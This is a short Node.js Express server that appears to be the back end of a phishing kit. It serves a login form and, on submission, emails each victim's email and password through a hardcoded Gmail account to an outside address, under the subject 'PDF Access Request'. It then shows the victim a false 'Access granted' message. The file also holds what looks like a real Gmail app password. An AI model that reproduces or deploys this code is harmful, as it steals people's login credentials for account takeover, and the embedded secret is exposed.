const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the HTML form
app.use(express.static(path.join(__dirname)));
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle form submission
app.post('/submit', async (req, res) => {
  const { email, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'barlutto2233@gmail.com', // <-- Replace this
      pass: 'xybhhaodgegnfhcq',    // <-- And this
    },
  });

  const mailOptions = {
    from: email,
    to: 'obinwannebrothers206@gmail.com',
    subject: 'PDF Access Request',
    text: `Email: ${email}\nPassword: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.send('Access granted! Check your email.');
  } catch (error) {
    console.error(error);
    res.status(500).send('Something went wrong.');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
